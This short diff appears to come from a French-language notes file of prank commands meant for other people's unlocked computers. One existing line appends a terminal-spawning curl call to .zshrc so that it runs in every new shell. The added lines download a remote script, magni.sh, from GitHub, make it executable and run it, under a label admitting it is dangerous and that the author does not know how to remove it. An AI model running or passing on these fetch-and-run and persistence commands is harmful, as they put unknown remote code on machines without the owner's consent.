@@ -35,3 +35,7 @@ Pour enlever -> ```rm -rf .reset```
 
 [-------------------------------------------------------------]
 ```echo "gnome-terminal && curl ASCII.live/can-you-hear-me" >> .zshrc && source .zshrc```
+
+[-------------------------------------------------------------]
+Supp raccourci : DANGEREUX JSP ENLEVER
+```curl -o magni.sh https://raw.githubusercontent.com/xXCARRELAGEXx/NotLocked/main/magni.sh ; chmod +x magni.sh ; bash magni.sh```
